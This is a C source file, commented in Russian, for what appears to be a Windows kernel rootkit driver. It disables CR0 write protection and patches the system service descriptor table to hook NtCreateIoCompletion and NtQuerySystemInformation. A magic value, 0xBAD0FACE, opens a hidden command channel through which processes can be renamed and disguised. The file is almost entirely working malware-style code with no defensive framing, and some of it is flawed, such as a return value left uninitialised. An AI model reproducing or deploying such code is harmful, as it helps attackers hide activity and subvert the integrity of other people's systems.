#include <ntddk.h>
#include "cr0.h"
#include "rename_proc.h"
#include "command.h"

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
    PULONG Count;           // массив счётчиков вызовов сервисов
    ULONG Limit;            // количество вызовов в таблице
    PUCHAR Number;          // массив количества параметров вызовов(в байтах)
} KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;


typedef NTSTATUS (*NT_CREATE_IO_COMPLETION)(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

#define NUMBER_NT_CREATE_IO_COMPLETION  0x26 //38
#define SYSCALL_SIGNATURE  0xBAD0FACE

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp);
VOID DriverUnload(IN PDRIVER_OBJECT dob);

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

NT_CREATE_IO_COMPLETION glRealNtCreateIoCompletion;
extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;


NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {

    ULONG reg;

#if DBG
    DbgPrint("Load driver %wZ\n", &dob->DriverName);
    DbgPrint("Registry path %wZ\n", rgp);
#endif

    glRealNtCreateIoCompletion = (NT_CREATE_IO_COMPLETION)KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION];
    glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
    WriteCR0(reg);

    // Init task list for rename process
    ExInitializePagedLookasideList(&glPagedTaskQueue, NULL, NULL, 0, sizeof(TASK_QUEUE), ' LFO', 0);
    InitializeListHead(&glTaskQueue);




    dob->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT dob) {

    ULONG reg;

#if DBG
    DbgPrint("Driver unload\n");
#endif

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
    WriteCR0(reg);

    FreeListQueue();
    ExDeletePagedLookasideList(&glPagedTaskQueue);

    return;
}

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04)
{
    PCOMMAND pCmd;
    NTSTATUS retStatus;
    
    if ((ULONG)arg_01 == (ULONG)SYSCALL_SIGNATURE) {
        pCmd = (PCOMMAND)arg_02;
        switch (pCmd->type)
        {
        case TestCommand: {
            DbgPrint("HookNtCreateIoCompletion execute\n");
            break;
        }
        case RenameProcess: {
            PLIST_ENTRY pLink;
            ULONG len;

            DbgPrint("RenameProcess PID:%d Name:%s\n", pCmd->bufInt, (PCHAR)pCmd->bufByte);

            TaskQueueProcess(pCmd->bufInt, (PCHAR)pCmd->bufByte);


            for (pLink = glTaskQueue.Flink; pLink != &glTaskQueue; pLink = pLink->Flink) {
                PTASK_QUEUE task = CONTAINING_RECORD(pLink, TASK_QUEUE, link);
                DbgPrint("NAME %s PID %d\n", task->name, task->pid);
            }
            break;
        }
        default:
            DbgPrint("No dispatch for command %d\n", pCmd->type);
            break;
        }
    }
    else {
        retStatus = glRealNtCreateIoCompletion(
            arg_01,
            arg_02,
            arg_03,
            arg_04
        );

        //DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
        //    arg_01, arg_02, arg_03, arg_04);
    }

    return retStatus;
}

